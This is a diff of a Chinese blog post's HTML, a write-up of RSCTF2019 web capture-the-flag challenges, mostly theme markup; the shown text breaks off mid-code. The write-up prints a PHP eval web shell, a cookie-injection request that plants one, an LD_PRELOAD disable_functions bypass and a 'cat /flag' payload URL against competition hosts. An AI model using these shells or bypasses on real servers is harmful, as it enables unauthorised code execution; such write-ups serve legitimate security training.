@@ -1,381 +1,151 @@
-<!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    
-  
-  <link href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css" />
-
-
-
-
-
-
-
-  
-
-<link href="//libs.cdnjs.net/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
-
-<link href="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="https://ftp.bmp.ovh/imgs/2019/12/bd3cd769bf9c605a.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="https://ftp.bmp.ovh/imgs/2019/12/fe3214c96f68b465.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="https://ftp.bmp.ovh/imgs/2019/12/a585dbaa8519a606.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="ctf,web," />
-
-
-
-
-
-
-
-
-
-
-<meta name="description" content="Getshell这道题。。。只能是我太菜了，居然以为出题人出错题，膜一下夜师傅。  第3行是密文串，urldecode之后直接看即可， 这里解密的时候，我是本地copy下来，然后我用echo 各种变量，得出line5-8分别是 12345.strtr6.substr7.528.base64_decode  然后进行变量替换，我比较笨，只会ctrl+h进行替换，耗费了好长时间，最后我都背下来了 然后">
-<meta name="keywords" content="ctf,web">
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>RSCTF2019-WEB | Jesen's Blog</title><meta name="keywords" content="web,ctf"><meta name="author" content="Jesen"><meta name="copyright" content="Jesen"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Getshell这道题。。。只能是我太菜了，居然以为出题人出错题，膜一下夜师傅。  第3行是密文串，urldecode之后直接看即可， 这里解密的时候，我是本地copy下来，然后我用echo 各种变量，得出line5-8分别是 12345.strtr6.substr7.528.base64_decode  然后进行变量替换，我比较笨，只会ctrl+h进行替换，耗费了好长时间，最后我都背下来了 然后">
 <meta property="og:type" content="article">
 <meta property="og:title" content="RSCTF2019-WEB">
-<meta property="og:url" content="&#x2F;2019&#x2F;11&#x2F;03&#x2F;RSCTF2019-WEB.html">
+<meta property="og:url" content="http://jesen.ddwhm.com/2019/11/03/RSCTF2019-WEB.html">
 <meta property="og:site_name" content="Jesen&#39;s Blog">
 <meta property="og:description" content="Getshell这道题。。。只能是我太菜了，居然以为出题人出错题，膜一下夜师傅。  第3行是密文串，urldecode之后直接看即可， 这里解密的时候，我是本地copy下来，然后我用echo 各种变量，得出line5-8分别是 12345.strtr6.substr7.528.base64_decode  然后进行变量替换，我比较笨，只会ctrl+h进行替换，耗费了好长时间，最后我都背下来了 然后">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="&#x2F;images&#x2F;image-20191103215947920.png">
-<meta property="og:image" content="&#x2F;images&#x2F;image-20191103220018419.png">
-<meta property="og:image" content="&#x2F;images&#x2F;image-20191103220037744.png">
-<meta property="og:image" content="&#x2F;images&#x2F;image-20191103220055368.png">
-<meta property="og:image" content="&#x2F;images&#x2F;clip_image002.jpg">
-<meta property="og:image" content="&#x2F;images&#x2F;clip_image004.jpg">
-<meta property="og:image" content="&#x2F;images&#x2F;clip_image006.jpg">
-<meta property="og:updated_time" content="2019-11-03T14:16:13.298Z">
+<meta property="og:locale">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2019-11-03T13:43:47.000Z">
+<meta property="article:modified_time" content="2019-11-03T14:16:13.298Z">
+<meta property="article:author" content="Jesen">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="&#x2F;images&#x2F;image-20191103215947920.png">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: '博主'
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://jesen.ddwhm.com/2019/11/03/RSCTF2019-WEB"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
+  google_ad_client: 'ca-pub-6452254005307046',
+  enable_page_level_ads: 'true'
+});</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
     },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
     }
-  };
-</script>
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'RSCTF2019-WEB',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2019-11-03 22:16:13'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
 
-  <link rel="canonical" href="/2019/11/03/RSCTF2019-WEB.html"/>
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
 
-
-
-
-
-  <title>RSCTF2019-WEB | Jesen's Blog</title>
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-
-
-
-
-
-
-
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
   
-  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Jesen's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-      
-        <h1 class="site-subtitle" itemprop="description">想要人前装逼,必须得在人后学习</h1>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-        <li class="menu-item menu-item-home">
-          <a href="/#" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            首页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/#%20" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/#%20" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            分类
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/#" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            归档
-          </a>
-        </li>
-      
-
-      
-    </ul>
-  
-
-  
-</nav>
-
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="/2019/11/03/RSCTF2019-WEB.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Jesen">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/images/jesen.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Jesen's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">RSCTF2019-WEB</h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-			
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-03T21:43:47+08:00">
-                2019-11-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2019/11/03/RSCTF2019-WEB.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/11/03/RSCTF2019-WEB.html" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2019/11/03/RSCTF2019-WEB.html" class="leancloud_visitors" data-flag-title="RSCTF2019-WEB">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><p>这道题。。。只能是我太菜了，居然以为出题人出错题，膜一下夜师傅。</p>
-<p><img src="/images/image-20191103215947920.png" alt="image-20191103215947920"></p>
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/images/jesen.jpg" onerror="onerror=null;src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 其他</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-music"></i><span> 测试1</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-video"></i><span> 测试2</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Jesen's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 其他</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-music"></i><span> 测试1</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-video"></i><span> 测试2</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">RSCTF2019-WEB</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2019-11-03T13:43:47.000Z" title="Created 2019-11-03 21:43:47">2019-11-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2019-11-03T14:16:13.298Z" title="Updated 2019-11-03 22:16:13">2019-11-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="RSCTF2019-WEB"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><p>这道题。。。只能是我太菜了，居然以为出题人出错题，膜一下夜师傅。</p>
+<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/image-20191103215947920.png" alt="image-20191103215947920"></p>
 <p>第3行是密文串，urldecode之后直接看即可，</p>
 <p>这里解密的时候，我是本地copy下来，然后我用echo 各种变量，得出line5-8分别是</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">5.strtr</span><br><span class="line">6.substr</span><br><span class="line">7.52</span><br><span class="line">8.base64_decode</span><br></pre></td></tr></table></figure>
@@ -384,11 +154,11 @@
 <p>然后解密之后发现，what？？还有一层?好吧，base64解！！！</p>
 <p>然后发现是两段和刚开始相似的代码，</p>
 <p>这里简单试验了一下</p>
-<p><img src="/images/image-20191103220018419.png" alt="image-20191103220018419"></p>
+<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/image-20191103220018419.png" alt="image-20191103220018419"></p>
 <p>发现解密之后和第一段差不多（那也很麻烦）</p>
 <p>继续解，最坑的是 第一段解出来是<?php ?>!!!!!!!!!!!!!</p>
 <p>第二段比较重要：内容是：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);</span><br><span class="line"> @<span class="keyword">eval</span>($_POST[ymlisisisiook]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);</span><br><span class="line"> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[ymlisisisiook]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>哈哈拿到shell了！！</p>
 <p>别急，好戏刚刚开始，你以为system(cat /flag)就行了？不行！</p>
@@ -399,626 +169,88 @@
 <hr>
 <p>中间经历一大段尝试，未果</p>
 <p>可以用LD_PRELOAD绕过，这时候发现一篇精品文章：</p>
-<p><a href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a></p>
 <p>嗯，应该可以，无奈发现mail函数也在被禁用的函数列表，</p>
 <p>没事，文章也写了可以用imap_mail()</p>
 <p>没有成功，应该是内部调用了mail函数然后被禁用。</p>
 <p>这时候一血出现了，我仍然没找到方法，只能是暂时搁置（其实是偶尔尝试）</p>
-<p><img src="/images/image-20191103220037744.png" alt="image-20191103220037744">👆血的教训</p>
-<p>晚上入睡前，逛先知社区发现了一个：<a href="https://xz.aliyun.com/t/4688">https://xz.aliyun.com/t/4688</a></p>
+<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/image-20191103220037744.png" alt="image-20191103220037744">👆血的教训</p>
+<p>晚上入睡前，逛先知社区发现了一个：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4688">https://xz.aliyun.com/t/4688</a></p>
 <p>嗯，，，发现error_log也可以调用sendmail</p>
 <p>从而利用ldpreload执行函数，</p>
-<p>这里推荐一个github地址(做本题里面的代码需要修改): <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a> </p>
+<p>这里推荐一个github地址(做本题里面的代码需要修改): <a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a> </p>
 <p>修改成这样：</p>
-<p><img src="/images/image-20191103220055368.png" alt="image-20191103220055368"></p>
+<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/image-20191103220055368.png" alt="image-20191103220055368"></p>
 <p>这里的例子传参是三个，我为了测试，把其中两个参数给去掉了，</p>
 <p>其中sopath为so文件目录，采用绝对路径，所以最后我的payload：</p>
-<p>[<a href="http://117.139.247.14:9113/poc.php?cmd=cat%20/flag]">http://117.139.247.14:9113/poc.php?cmd=cat%20/flag]</a>(<a href="http://117.139.247.14:9113/poc.php?cmd=cat">http://117.139.247.14:9113/poc.php?cmd=cat</a> /flag)  成功getflag,哎，与一血失之交臂，只能二血了。</p>
+<p>[<a target="_blank" rel="noopener" href="http://117.139.247.14:9113/poc.php?cmd=cat%20/flag]">http://117.139.247.14:9113/poc.php?cmd=cat%20/flag]</a>(<a target="_blank" rel="noopener" href="http://117.139.247.14:9113/poc.php?cmd=cat">http://117.139.247.14:9113/poc.php?cmd=cat</a> /flag)  成功getflag,哎，与一血失之交臂，只能二血了。</p>
 <h1 id="EzCode"><a href="#EzCode" class="headerlink" title="EzCode"></a>EzCode</h1><p>大佬在睡觉我在做题，运气拿到了一血</p>
 <p>看页面源码，什么都没有，那只能扫一下网站了，扫到了 index.php.bak</p>
 <p>拿到index.php的源码观察，</p>
-<p><strong><img src="/images/clip_image002.jpg" alt="img"></strong></p>
+<p><strong><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/clip_image002.jpg" alt="img"></strong></p>
 <p>只是用正则过滤了post，get 没过滤cookie（后期好像没用上）</p>
 <p>所以传入cookie头 ： <strong>Cookie: yemoli=php代码</strong></p>
 <p>此时访问：<code>view-source:http://117.139.247.14:9532/yemoli.php</code></p>
 <p>发现，过滤了引号，因为addslashes  然后还发现只要有<code>@eval($_POST[sb])</code>方式绕过</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: 117.139.247.14:9532</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie:yemoli=eval($_POST[sb])</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
 
-<p><strong><img src="/images/clip_image004.jpg" alt="img"></strong></p>
+<p><strong><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/clip_image004.jpg" alt="img"></strong></p>
 <p>这里注意 本来pHp左右是有双引号的，但是被我删除了，因为有和没有是一样的而且双引号是被过滤的</p>
 <p>然后即可链接了，哈哈哈哈  然后，看见和getshell题相似的目录我心理一哆嗦，完蛋，怕是也禁用了各种函数</p>
-<p>我执行了一下phpinfo函数，幸运的是发现并没有和getshell一题一样，一个disabiledfunctions也没有，太好了 , 果断传文件<img src="/images/clip_image006.jpg" alt="img"></p>
+<p>我执行了一下phpinfo函数，幸运的是发现并没有和getshell一题一样，一个disabiledfunctions也没有，太好了 , 果断传文件<img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/clip_image006.jpg" alt="img"></p>
 <p>访问即可获取flag </p>
-<h1 id="Bestlanguage"><a href="#Bestlanguage" class="headerlink" title="Bestlanguage"></a>Bestlanguage</h1><p>访问题目地址:<a href="http://117.139.247.14:9531/">http://117.139.247.14:9531</a> 可见直接给源码，观察,涉及到反序列化利用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yemoli</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $alive;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;alive = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;alive = <span class="keyword">new</span> good();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;alive-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">good</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"I am a good boy!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bad</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span 